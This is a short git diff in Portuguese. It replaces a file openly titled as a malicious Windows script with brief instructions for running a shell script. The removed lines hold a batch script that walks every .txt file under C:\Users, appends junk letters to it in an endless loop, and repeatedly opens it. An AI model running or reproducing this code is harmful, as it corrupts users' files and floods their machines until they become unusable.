@@ -1,24 +1,7 @@
-# scriptmaliciosoprawindows
+Salva como alguma coisa no bloco de notas e roda como bash script.sh
 
-@echo off
-chcp 65001 > nul
-color 0A
+Se der erro roda
+	chmod +x script.sh
+	./script.sh
 
-rem aaaaaaaaaa
-
-
-:bombona
-for /R "C:\Users" %%f in (*.txt) do (
-	echo Arquivo encontrado: %%f
-	echo testando escrita... >> %%f
-	
-	:bomba
-	for %%i in (Q, W, E, R, T, Y, U, I, O, P, A, S, D, F, G, H, J, K, L, Ç, Z, X, C, V, B, N, M, q, w, e, r, t, 	y, u, i, o, p, a, s, d, f, g, h, j, k, l, z, x, c, v, b, n, m) do (
-		echo %%i >> %%f
-	)
-	start %%f
-	goto bomba
-)
-goto bombona
-
-rem aaaaaaaaaa
+(substitui script por como você salvou o negócio)
